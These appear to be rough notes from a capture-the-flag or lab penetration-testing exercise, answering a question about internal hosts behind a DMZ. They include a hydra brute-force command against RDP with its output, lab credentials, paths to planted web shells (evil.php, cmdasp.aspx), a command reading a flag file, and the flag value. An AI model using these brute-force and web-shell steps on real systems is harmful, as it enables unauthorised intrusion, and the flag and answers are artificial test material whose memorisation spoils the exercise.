## 15 How many hosts exist within the internal network that cannot be accessed through the DMZ network?

| __2__

3

4

5



```bash

LINUX
192.168.100.67
ssh root@192.168.100.67
The authenticity of host '192.168.100.67 (192.168.100.67)' can't be established.
ECDSA key fingerprint is SHA256:EsOSZ3mppLPrW8ffBhf6gu2ICYdzm5JAvbkyyxJLZrs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.67' (ECDSA) to the list of known hosts.
root@192.168.100.67: Permission denied (publickey).


Windows
192.168.100.63

root@kali:~# hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.63
[DATA] attacking rdp://192.168.100.63:3389/
[STATUS] 1075.00 tries/min, 1075 tries in 00:01h, 14343324 to do in 222:23h, 4 active

[STATUS] 879.93 tries/min, 13199 tries in 00:15h, 14331200 to do in 271:27h, 4 active

```





```txt
WINSERVER-01 
192.168.100.50
mike/diamond
wordpress.local/evil.php
http://192.168.100.50/wordpress/


WINSERVER-02
192.168.100.51
http://192.168.100.51/aspnet_client/cmdasp.aspx
------------------------------------------------------------------------------
Administrator            Guest                    steven                   
The command completed with one or more errors.
type "C:\Users\Administrator\Desktop\flag.txt"
cb7905d06d4d407cb15992c24e0ca884


Linux-ip-192-168-100-52
192.168.100.52
http://192.168.100.52/drupal/


WINSERVER-03 
192.168.100.55
mary/hotmama




KALI
192.168.100.5
```

```bash

LINUX
192.168.100.67
ssh root@192.168.100.67
The authenticity of host '192.168.100.67 (192.168.100.67)' can't be established.
ECDSA key fingerprint is SHA256:EsOSZ3mppLPrW8ffBhf6gu2ICYdzm5JAvbkyyxJLZrs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.67' (ECDSA) to the list of known hosts.
root@192.168.100.67: Permission denied (publickey).


Windows
192.168.100.63


```

